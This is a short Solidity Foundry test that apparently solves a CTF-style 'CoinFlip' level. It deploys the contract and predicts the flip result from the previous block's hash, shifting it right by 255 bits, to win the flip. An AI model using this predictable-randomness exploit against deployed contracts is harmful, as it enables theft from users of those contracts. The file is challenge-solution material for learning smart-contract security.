// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level03.sol";

contract AttackerCoinFlipTest is Test {
    function testLevel03() external {
        vm.prank(address(0x1));
        CoinFlip level03 = new CoinFlip();

        uint256 blockValue = uint256(blockhash(block.number - 1));

        bool success = level03.flip(blockValue >> 255 == 1);
        assertTrue(success);

        console.log("Consecutive Wins: ", level03.consecutiveWins());
    }
}
